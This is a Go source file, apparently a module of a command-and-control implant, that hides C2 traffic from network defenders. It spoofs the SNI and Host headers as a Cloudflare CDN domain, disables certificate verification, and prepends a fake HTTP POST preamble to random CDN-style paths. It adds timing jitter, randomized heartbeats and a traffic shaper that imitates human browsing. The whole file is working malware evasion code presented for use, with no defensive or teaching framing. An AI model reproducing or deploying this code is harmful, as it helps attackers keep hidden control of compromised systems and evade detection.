package evasion

import (
	"crypto/rand"
	"crypto/tls"
	"fmt"
	"math/big"
	"net"
	"time"
)

// CamouflageConfig holds TLS traffic obfuscation settings.
type CamouflageConfig struct {
	Enabled          bool
	DomainFront      string // e.g., "cdn.cloudflare.com"
	SNI              string // Server Name Indication spoof
	UserAgent        string
	JitterPercent    float64 // 0.3 = ±30% timing jitter
	HeartbeatMin     time.Duration
	HeartbeatMax     time.Duration
}

// DefaultCamouflage returns recommended evasion settings.
func DefaultCamouflage() *CamouflageConfig {
	return &CamouflageConfig{
		Enabled:       true,
		DomainFront:   "cdn.cloudflare.com",
		SNI:           "cdn.cloudflare.com",
		UserAgent:     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
		JitterPercent: 0.35,
		HeartbeatMin:  25 * time.Second,
		HeartbeatMax:  45 * time.Second,
	}
}

// CamouflagedDialer creates a TLS connection with traffic camouflage.
type CamouflagedDialer struct {
	cfg    *CamouflageConfig
	tlsCfg *tls.Config
}

// NewCamouflagedDialer creates a TLS dialer with domain fronting.
func NewCamouflagedDialer(cfg *CamouflageConfig) *CamouflagedDialer {
	return &CamouflagedDialer{
		cfg: cfg,
		tlsCfg: &tls.Config{
			ServerName:         cfg.SNI,
			InsecureSkipVerify: true,
			MinVersion:         tls.VersionTLS12,
		},
	}
}

// Dial connects via TLS with traffic that looks like a regular HTTPS request.
func (d *CamouflagedDialer) Dial(realAddr string) (net.Conn, error) {
	if !d.cfg.Enabled {
		return net.DialTimeout("tcp", realAddr, 10*time.Second)
	}

	// Random jitter before connecting
	jitter := d.randomJitter(500 * time.Millisecond)
	time.Sleep(jitter)

	// TLS dial with SNI = CDN domain (looks like regular HTTPS to CDN)
	conn, err := tls.Dial("tcp", realAddr, d.tlsCfg)
	if err != nil {
		return nil, fmt.Errorf("camouflaged dial: %w", err)
	}

	// Send HTTP-looking preamble to disguise C2 traffic
	// This makes the initial bytes look like a regular HTTPS request
	// even though we immediately switch to the C2 protocol after TLS handshake
	preamble := d.buildHTTPPreamble()
	if _, err := conn.Write(preamble); err != nil {
		conn.Close()
		return nil, fmt.Errorf("camouflaged write preamble: %w", err)
	}

	return conn, nil
}

func (d *CamouflagedDialer) buildHTTPPreamble() []byte {
	// Looks like an HTTP request to a CDN resource
	// Real C2 protocol starts after this padding
	paths := []string{
		"/cdn-cgi/rum?t=" + randomHex(16),
		"/static/js/chunk-vendors." + randomHex(8) + ".js",
		"/api/v1/telemetry?d=" + randomHex(12),
	}
	idx, _ := rand.Int(rand.Reader, big.NewInt(int64(len(paths))))
	path := paths[idx.Int64()]

	size, _ := rand.Int(rand.Reader, big.NewInt(500))
	preamble := fmt.Sprintf(
		"POST %s HTTP/1.1\r\n"+
			"Host: %s\r\n"+
			"User-Agent: %s\r\n"+
			"Accept: */*\r\n"+
			"Content-Type: application/octet-stream\r\n"+
			"Content-Length: %d\r\n\r\n",
		path, d.cfg.DomainFront, d.cfg.UserAgent, size.Int64()+100,
	)

	return []byte(preamble)
}

// JitteredSleep sleeps with random jitter to avoid timing analysis.
func (d *CamouflagedDialer) JitteredSleep(base time.Duration) time.Duration {
	jitter := d.randomJitter(time.Duration(float64(base) * d.cfg.JitterPercent))
	total := base + jitter
	time.Sleep(total)
	return total
}

// RandomHeartbeat returns a random interval between min and max.
func (d *CamouflagedDialer) RandomHeartbeat() time.Duration {
	delta := d.cfg.HeartbeatMax - d.cfg.HeartbeatMin
	deltaNanos := delta.Nanoseconds()
	randVal, _ := rand.Int(rand.Reader, big.NewInt(deltaNanos))
	return d.cfg.HeartbeatMin + time.Duration(randVal.Int64())
}

func (d *CamouflagedDialer) randomJitter(max time.Duration) time.Duration {
	if max <= 0 {
		return 0
	}
	randVal, _ := rand.Int(rand.Reader, big.NewInt(max.Nanoseconds()))
	return time.Duration(randVal.Int64())
}

func randomHex(n int) string {
	b := make([]byte, n)
	rand.Read(b)
	const hexChars = "0123456789abcdef"
	for i := range b {
		b[i] = hexChars[b[i]%16]
	}
	return string(b)
}

// TrafficShaper adds random delays and padding to mimic human browsing patterns.
type TrafficShaper struct {
	burstCount int
	burstSize  int
	idleTime   time.Duration
}

// NewTrafficShaper creates a traffic shaper for C2 communication.
func NewTrafficShaper() *TrafficShaper {
	bc, _ := rand.Int(rand.Reader, big.NewInt(3))
	bs, _ := rand.Int(rand.Reader, big.NewInt(4096))
	it, _ := rand.Int(rand.Reader, big.NewInt(5))
	return &TrafficShaper{
		burstCount: int(bc.Int64()) + 2,
		burstSize:  int(bs.Int64()) + 1024,
		idleTime:   time.Duration(it.Int64()+3) * time.Second,
	}
}

// NextDelay returns the delay before the next message to simulate browsing.
func (ts *TrafficShaper) NextDelay(isLastInBurst bool) time.Duration {
	if !isLastInBurst {
		delay, _ := rand.Int(rand.Reader, big.NewInt(200))
		return time.Duration(delay.Int64()+50) * time.Millisecond
	}
	delay, _ := rand.Int(rand.Reader, big.NewInt(2000))
	return ts.idleTime + time.Duration(delay.Int64())*time.Millisecond
}
